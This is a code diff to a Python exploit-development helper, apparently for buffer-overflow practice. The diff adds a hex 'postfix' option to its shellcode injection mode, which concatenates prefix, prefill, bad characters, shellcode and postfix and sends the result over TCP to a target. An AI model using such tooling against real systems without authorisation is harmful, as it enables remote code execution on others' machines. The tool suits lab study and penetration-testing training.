@@ -119,7 +119,7 @@ def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step):
             sys.exit(1)
 
 
-def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, useBadChars):
+def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, useBadChars, postfix):
 
     timeout = 5
 
@@ -130,9 +130,9 @@ def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, us
     s.settimeout(timeout)
     s.connect((target_ip, target_port))
 
-    payload = prefix + prefill + BadChars + shellcode
+    payload = prefix + prefill + BadChars + shellcode + postfix
 
-    s.sendall(payload + b"\n\r")
+    s.sendall(payload)
 
     print(f"Injected {len(payload)} bytes to {target_ip}:{target_port}")
 
@@ -158,6 +158,8 @@ def main():
                         help='Step is amount of bytes to use in Fuzzying mode')
     parser.add_argument('-x', '--prefix', default='', type=str,
                         help='prefix can be used at the beginning of each TCP frame to make correct requests')
+    parser.add_argument('-p', '--postfix', default='', type=str,
+                        help='provide as HEX value. postfix may be needed to send the payload. It is prepended at the end')
     parser.add_argument('-n', '--prefill_num', default=0, type=int,
                         help='Prefill the payload with n bytes after prefix')
     # Prefill with ascii pattern to find exact offset or insert non byte values
@@ -178,7 +180,7 @@ def main():
     target_port = args.targetPort
     step = args.step
     prefix = bytearray(args.prefix, encoding='ascii')
-    #postfix = bytearray(args.postfix, encoding='ascii')
+    postfix = bytearray.fromhex(args.postfix)
     prefill_num = args.prefill_num
     prefill_pattern = bytearray(args.prefill_pattern, encoding='ascii')
     useBadChars = args.useBadChars
@@ -195,7 +197,7 @@ def main():
 
         #test_connection(target_ip, target_port)
         inject_mode(target_ip, target_port, BadChars,
-                    prefix, prefill, shellcode, useBadChars)
+                    prefix, prefill, shellcode, useBadChars, postfix)
 
     else:
         print(f"Uknown mode: {mode} ... exiting")
